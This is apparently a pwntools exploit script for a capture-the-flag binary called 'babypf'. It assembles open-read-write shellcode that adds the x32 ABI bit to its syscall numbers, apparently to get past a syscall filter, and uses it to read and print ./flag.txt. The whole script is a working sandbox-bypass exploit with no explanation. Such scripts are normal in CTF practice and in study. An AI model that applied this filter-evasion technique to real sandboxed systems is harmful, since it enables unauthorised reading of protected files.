from pwn import *
context.arch = 'amd64'

p = process('./babypf')

sc = asm(
	'''
	jmp filename

	orw:
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2+0x40000000
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x30
	mov rax, 0+0x40000000
	syscall

	mov rdi, 1
	mov rdx, 0x30
	mov rax, 1+0x40000000
	syscall

	mov rax, 60
	xor rdi, rdi
	syscall

	filename:
	call orw
	.ascii "./flag.txt"
	.byte 0
	'''
)
p.sendafter('LOAD PROGRAM', p32(len(sc)))
p.send(sc)

p.interactive()